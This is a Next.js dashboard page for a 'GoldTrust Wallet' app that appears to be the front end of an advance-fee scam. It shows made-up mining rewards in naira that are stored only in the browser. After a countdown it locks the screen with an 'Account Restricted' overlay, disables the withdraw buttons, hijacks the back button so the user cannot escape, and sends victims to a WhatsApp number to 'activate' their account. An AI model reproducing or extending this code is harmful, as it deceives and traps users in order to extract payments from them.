// pages/dashboard.js
import { useEffect, useState } from 'react';
import { useRouter } from 'next/router';
import Layout from '../components/Layout';
import LogoHeader from '../components/LogoHeader';
import Link from 'next/link';
import { loadUser, loadBalance, loadTx, saveBalance, saveTx } from '../utils/storage';
import { formatNaira } from '../utils/format';

export default function Dashboard(){
  const router = useRouter();
  const [user,setUser] = useState(null);
  const [balance,setBalance] = useState(0);
  const [tx,setTx] = useState([]);
  const [loading, setLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('Loading dashboard...');
  const [showIntro, setShowIntro] = useState(false);
  const [showWelcome, setShowWelcome] = useState(false);
  const [introIndex, setIntroIndex] = useState(0);
  const [stats, setStats] = useState({ totalMined:0, totalWithdrawn:0, txCount:0 });

  /* ====== ADDED STATES & CONFIG (only additions) ====== */
  const [restricted, setRestricted] = useState(false); // UI lock state
  const [timeLeft, setTimeLeft] = useState(0); // ms remaining until restriction
  const RESTRICT_AFTER = 10 * 60 * 1000; // 10 minutes (not used to compute — canonical source is localStorage.gt_restriction_end)
  const WHATSAPP_LINK = 'https://wa.me/2347085462173?text=Hello%2C%20I%20want%20to%20activate%20my%20GoldTrust%20Wallet%20account';
  /* ==================================================== */

  useEffect(()=>{
    const u = loadUser();
    if(!u) {
      router.push('/');
      return;
    }
    setUser(u);
    setBalance(loadBalance());
    const transactions = loadTx() || [];
    setTx(transactions);
    computeStats(transactions);

    // show intro slides only once (per device)
    try {
      if (typeof window !== 'undefined') {
        const seenIntro = localStorage.getItem('gt_seen_intro');
        if (!seenIntro) {
          setShowIntro(true);
          // mark seen so it doesn't show forever; leaving welcome to appear after slides
          localStorage.setItem('gt_seen_intro','1');
        } else {
          // optionally show a small welcome only once on first full session
          const seenWelcome = localStorage.getItem('gt_seen_welcome');
          if (!seenWelcome) {
            setShowWelcome(true);
            localStorage.setItem('gt_seen_welcome','1');
            // auto-hide welcome after 2.2s
            setTimeout(()=> setShowWelcome(false), 2200);
          }
        }
      }
    } catch(e){
      // ignore localStorage errors
    }
  },[]);

  /* ====== NEW: observe restriction timestamp + activation flag ====== */
  useEffect(() => {
    const check = () => {
      try {
        const activated = localStorage.getItem('gt_activated') === 'true';
        if (activated) {
          setRestricted(false);
          setTimeLeft(0);
          return;
        }

        const end = localStorage.getItem('gt_restriction_end');
        if (!end) {
          setRestricted(false);
          setTimeLeft(0);
          return;
        }

        const remaining = Number(end) - Date.now();
        if (remaining <= 0) {
          // restriction active (time elapsed) → show overlay / lock
          setRestricted(true);
          setTimeLeft(0);
        } else {
          // still in countdown window (show the "withdrawal window ends in" banner)
          setRestricted(false);
          setTimeLeft(remaining);
        }
      } catch (e) {
        // ignore
      }
    };

    check();
    const iv = setInterval(check, 1000);
    return () => clearInterval(iv);
  }, []);
  /* ================================================================ */

  // disable back button while restricted (prevent user from escaping)
  useEffect(() => {
    if (!restricted) return;
    const blockBack = () => {
      try { window.history.pushState(null, '', window.location.href); } catch (e) {}
    };
    blockBack();
    window.addEventListener('popstate', blockBack);
    return () => window.removeEventListener('popstate', blockBack);
  }, [restricted]);

  function computeStats(transactions){
    const totalMined = (transactions.filter(t=>t.type==='mine' && (t.status==='claimed' || t.status==='successful'))
      .reduce((s,t)=>s + Number(t.amount||0), 0));
    const totalWithdrawn = (transactions.filter(t=>t.type==='withdraw_confirm' || (t.type==='withdraw' && t.status==='successful'))
      .reduce((s,t)=>s + Number(t.amount||0), 0));
    setStats({ totalMined, totalWithdrawn, txCount: (transactions.length || 0) });
  }

  const startQuick = (path, message='Opening...') => {
    setLoadingMessage(message);
    setLoading(true);
    // staged messages for better UX
    setTimeout(()=> setLoadingMessage('Preparing secure session...'), 400);
    setTimeout(()=> {
      router.push(path);
      // no setLoading(false) because route changes
    }, 900);
  };

  const quickMine = () => startQuick('/mine', 'Preparing miner...');
  const quickWithdraw = () => startQuick('/withdraw', 'Opening withdraw...');
  const quickBuyCode = () => startQuick('/buy-code', 'Opening activation store...');
  const quickHistory = () => startQuick('/history', 'Loading transactions...');

  const copyReferral = async () => {
    const link = `${typeof window !== 'undefined' ? window.location.origin : ''}/register?ref=${user?.phone || ''}`;
    try {
      await navigator.clipboard.writeText(link);
      alert('Referral link copied to clipboard!');
    } catch (e) {
      prompt('Copy this referral link:', link);
    }
  };

  if(!user) return <Layout><div className="center"><div className="card">Loading...</div></div></Layout>;

  // preview latest 5 transactions
  const previewTx = (tx || []).slice(0,5);

  // Intro slides content (two slides)
  const slides = [
    {
      title: `Welcome to GoldTrust Wallet`,
      subtitle: `Safe • Fast • Rewarding`,
      body: `GoldTrust Wallet gives you a Free Miner Robot to start earning immediately. Secure local storage, fast claims, and a simple withdraw flow.`,
      icon: '🎉'
    },
    {
      title: `How to earn`,
      subtitle: `Simple and fun`,
      body: `1) Tap Mine to start your robot.  2) Wait for the mining animation.  3) Claim your reward (₦60k–₦100k on the free plan). Withdraw securely with a 4-digit code.`,
      icon: '⛏️'
    }
  ];

  const nextSlide = () => {
    if (introIndex < slides.length - 1) setIntroIndex(i=>i+1);
    else finishIntro();
  };
  const prevSlide = () => { if(introIndex>0) setIntroIndex(i=>i-1); };

  const finishIntro = () => {
    setShowIntro(false);
    // show a short welcome popup after slides
    setShowWelcome(true);
    setTimeout(()=> setShowWelcome(false), 2000);
  };

  /* ============== HELPER ADDED ============== */
  const formatTime = (ms) => {
    const s = Math.floor(ms / 1000);
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m}:${sec.toString().padStart(2,'0')}`;
  };
  /* =========================================== */

  return (
    <Layout>
      <LogoHeader />

      {/* ===== FULL-SCREEN BLUR + LOCK OVERLAY WHEN restricted === true ===== */}
      {restricted && (
        <div
          role="dialog"
          aria-modal="true"
          style={{
            position: 'fixed',
            inset: 0,
            backgroundColor: 'rgba(0,0,0,0.45)',
            backdropFilter: 'blur(8px)',
            WebkitBackdropFilter: 'blur(8px)',
            display: 'flex',
            justifyContent: 'center',
            alignItems: 'center',
            zIndex: 9999,
            pointerEvents: 'auto'
          }}
        >
          <div className="introBox card" style={{ maxWidth: 480, width: '94%', textAlign: 'center', padding: 24 }}>
            <div style={{ fontWeight: 800, fontSize: 20, marginBottom: 12 }}>
              Account Restricted ⚠️
            </div>

            <div className="small muted" style={{ lineHeight: 1.6, marginBottom: 16 }}>
              Dear <strong>{user.fullName}</strong>, your recent withdrawal was processed.
              To continue using the app please activate your account.
            </div>

            {/* show timer if it's available before final lock (should be 0 once locked) */}
            {timeLeft > 0 ? (
              <div style={{ marginBottom: 12, fontWeight: 700, color: '#1e40af' }}>
                ⏱️ Restriction will engage in: {formatTime(timeLeft)}
              </div>
            ) : (
              <div style={{ marginBottom: 12, fontWeight: 700, color: '#dc2626' }}>
                ⛔ Account locked — activation required
              </div>
            )}

            <button
              className="btn"
              style={{ width: '100%', fontWeight: 800 }}
              onClick={() => { window.location.href = WHATSAPP_LINK; }}
            >
              👉 CLICK TO ACTIVATE
            </button>
          </div>
        </div>
      )}
      {/* ================================================================ */}

      {/* ===== ADDED: show countdown when active and not yet restricted ===== */}
      {timeLeft > 0 && !restricted && (
        <div className="card" style={{marginBottom:12}}>
          <div className="small muted">⏳ Withdrawal window ends in: <strong>{formatTime(timeLeft)}</strong></div>
        </div>
      )}
      {/* ============================================================= */}

      <div style={{display:'grid',gap:18, gridTemplateColumns: '1fr', alignItems:'start'}}>
        {/* Top row: Balance & Quick stats */}
        <div className="card" style={{display:'flex',gap:18,flexWrap:'wrap',alignItems:'center',justifyContent:'space-between'}}>
          <div style={{minWidth:260,flex:1}}>
            <div className="small muted">Wallet Balance</div>
            <div style={{fontSize:28,fontWeight:800}}>{formatNaira(balance)}</div>
            <div className="small muted">{user.fullName} • Miner: {user.phone}</div>
            <div style={{height:8}} />
            <div style={{display:'flex',gap:12,flexWrap:'wrap'}}>
              <button className="btn" onClick={quickMine}>⛏️ Mine</button>
              <button className="btnGhost" onClick={quickWithdraw} disabled={restricted}>💸 Withdraw</button>
              <button className="btnGhost" onClick={quickBuyCode} disabled={restricted}>🧾 Buy Code</button>
            </div>
          </div>

          <div style={{display:'flex',gap:12,alignItems:'center'}}>
            <div style={{textAlign:'right'}}>
              <div className="small muted">Total mined</div>
              <div style={{fontWeight:800}}>{formatNaira(stats.totalMined)}</div>
            </div>

            <div style={{textAlign:'right'}}>
              <div className="small muted">Withdrawn</div>
              <div style={{fontWeight:800}}>{formatNaira(stats.totalWithdrawn)}</div>
            </div>

            <div style={{textAlign:'right'}}>
              <div className="small muted">Transactions</div>
              <div style={{fontWeight:800}}>{stats.txCount}</div>
            </div>
          </div>
        </div>

        {/* Middle row: Profile card + Actions */}
        <div style={{display:'grid',gap:18,gridTemplateColumns: 'repeat(auto-fit,minmax(260px,1fr))'}}>
          <div className="card">
            <div style={{display:'flex',justifyContent:'space-between',alignItems:'center'}}>
              <div>
                <div style={{fontWeight:800,fontSize:18}}>{user.fullName}</div>
                <div className="small muted">{user.phone}</div>
                <div style={{height:8}}/>
                <div className="small muted">Plan: <strong>{user.plan || 'Free Miner Robot'}</strong></div>
                <div style={{height:6}}/>
                <div className="small muted">Referral: <span style={{color:'var(--gold)'}}>{user.referral || '—'}</span></div>
              </div>
              <div style={{textAlign:'right'}}>
                <button className="btnGhost" onClick={()=>router.push('/profile')}>Edit Profile</button>
                <div style={{height:8}}/>
                <button className="btnGhost" onClick={copyReferral}>Share Referral</button>
              </div>
            </div>
          </div>

          <div className="card">
            <h3 style={{marginTop:0}}>Quick Tools</h3>
            <div style={{display:'flex',gap:10,flexWrap:'wrap'}}>
              <button className="btnGhost" onClick={()=>router.push('/buy-code')}>Buy Code</button>

              <button className="btnGhost" onClick={()=>router.push('/history')}>Full History</button>

              <button className="btnGhost" onClick={()=>{ navigator.share ? navigator.share({title:'GoldTrust Wallet', text:'Join me on GoldTrust Wallet', url: window.location.href }) : copyReferral(); }}>Share App</button>
            </div>
            <div style={{height:8}} />
            <div className="small muted">Tip: Use <strong>Mine</strong> to earn and then claim rewards to your wallet.</div>
          </div>
        </div>

        {/* Recent transactions */}
        <div className="card">
          <div style={{display:'flex',justifyContent:'space-between',alignItems:'center'}}>
            <h3 style={{margin:0}}>Recent Transactions</h3>
            <div style={{display:'flex',gap:8,alignItems:'center'}}>
              <button className="btnGhost" onClick={quickHistory}>View all</button>
            </div>
          </div>

          <div style={{height:12}} />
          {previewTx.length===0 && <div className="small muted">No transactions yet. Mine to see a record here.</div>}
          {previewTx.map(t=>(
            <div key={t.created_at || Math.random()} className="tx" style={{alignItems:'center'}}>
              <div>
                <div style={{fontWeight:700}}>{(t.type || '').toUpperCase()}</div>
                <div className="small muted">{new Date(t.created_at).toLocaleString()}</div>
              </div>
              <div style={{textAlign:'right'}}>
                <div style={{fontWeight:800}}>{formatNaira(t.amount)}</div>
                <div className={t.status==='successful' || t.status==='claimed' ? 'success' : 'muted'} style={{fontSize:12}}>{t.status}</div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Intro slides overlay (two slides) */}
      {showIntro && (
        <div className="introOverlay" role="dialog" aria-modal="true">
          <div className="introBox card">
            <div style={{display:'flex', justifyContent:'space-between', alignItems:'center'}}>
              <div style={{display:'flex', gap:12, alignItems:'center'}}>
                <div style={{fontSize:28}}>{slides[introIndex].icon}</div>
                <div>
                  <div style={{fontWeight:800}}>{slides[introIndex].title}</div>
                  <div className="small muted">{slides[introIndex].subtitle}</div>
                </div>
              </div>
              <div>
                <button className="btnGhost" onClick={() => { setShowIntro(false); /* user skipped intro */ }}>Skip</button>
              </div>
            </div>

            <div style={{height:12}} />
            <div className="small muted" style={{minHeight:64, whiteSpace:'pre-wrap'}}>{slides[introIndex].body}</div>

            <div style={{height:12}} />
            <div style={{display:'flex',alignItems:'center',justifyContent:'space-between'}}>
              <div>
                {/* dots */}
                {slides.map((s,i)=>(

                  <span key={i} className={`dot ${i===introIndex?'active':''}`} onClick={()=>setIntroIndex(i)} />
                ))}
              </div>

              <div style={{display:'flex',gap:8}}>
                {introIndex>0 && <button className="btnGhost" onClick={prevSlide}>Back</button>}
                <button className="btn" onClick={nextSlide}>{introIndex === slides.length - 1 ? 'Finish' : 'Next'}</button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Short welcome popup (after slides or for first session) */}
      {showWelcome && (
        <div className="welcomeOverlay" role="dialog" aria-modal="true">
          <div className="welcomeBox card">
            <div style={{display:'flex',gap:12,alignItems:'center'}}>
              <div style={{fontSize:34}}>✨</div>
              <div>
                <div style={{fontWeight:800,fontSize:18}}>Welcome, {user.fullName.split(' ')[0]}!</div>
                <div className="small muted">Your wallet is ready — current balance {formatNaira(balance)}</div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Global loader overlay */}
      {loading && (
        <div className="loadingOverlay" role="status" aria-live="polite">
          <div className="loadingBox">
            <div className="loader" aria-hidden="true">
              <span className="ring" />
              <span className="ring ring2" />
              <span className="spark" />
            </div>
            <div>
              <div className="loaderText">{loadingMessage}</div>
              <div className="small muted" style={{marginTop:6}}>One moment please...</div>
            </div>
          </div>
        </div>
      )}
    </Layout>
  );
}